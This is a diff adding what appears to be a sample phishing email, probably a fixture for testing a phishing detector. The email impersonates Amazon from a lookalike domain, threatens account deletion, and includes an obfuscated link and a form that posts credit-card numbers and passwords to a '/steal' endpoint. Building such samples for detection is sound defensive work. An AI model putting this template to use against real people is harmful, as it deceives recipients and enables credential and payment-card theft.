@@ -1,0 +1,17 @@
+From: "Amazon Security" <security@amazon-account-secure.xyz>
+To: customer@gmail.com
+Subject: Your Amazon order has been cancelled - Action required
+Date: Mon, 14 Apr 2025 10:00:00 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+
+<html><body>
+<p>Dear Amazon Customer,</p>
+<p>Your account has been suspended due to unusual activity!</p>
+<p>Click to verify: <a href="http://amazon-secure%40verify.xyz/login?account=confirm">Verify Account</a></p>
+<p>WARNING: Failure to verify will result in permanent account deletion!!!</p>
+<form action="http://amazon-secure.xyz/steal" method="post">
+<input type="text" name="card_number" placeholder="Credit card"/>
+<input type="password" name="password" placeholder="Password"/>
+</form>
+</body></html>
